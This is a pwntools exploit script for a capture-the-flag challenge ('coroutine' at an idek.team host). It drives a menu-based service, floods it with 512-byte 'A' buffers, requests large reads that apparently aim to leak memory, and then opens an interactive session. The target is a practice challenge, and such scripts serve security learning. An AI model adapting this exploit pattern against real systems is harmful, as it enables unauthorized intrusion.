from pwn import *
import time
#context.log_level = 'debug'
p = remote("coroutine.chal.idek.team", 1337)

def conn():
    p.recvuntil(b"> ")
    p.sendline(b"1")

def set_rcv(size):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"> ")
    p.sendline(str(size).encode('utf-8'))

def send_str(string):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.recvuntil(b"> ")
    p.sendline(string)

def recv(size):
    #p.recvuntil(b"> ")
    p.sendline(b"5")
    #p.recvuntil(b"> ")
    p.sendline(str(size).encode('utf-8'))

set_rcv(8)
conn()

for i in range(8):
    send_str(b"A" * 512)
time.sleep(0.5)
recv(16000)
time.sleep(0.5)
recv(16000)
time.sleep(0.5)
recv(16000)
time.sleep(0.5)
recv(16000)
p.interactive()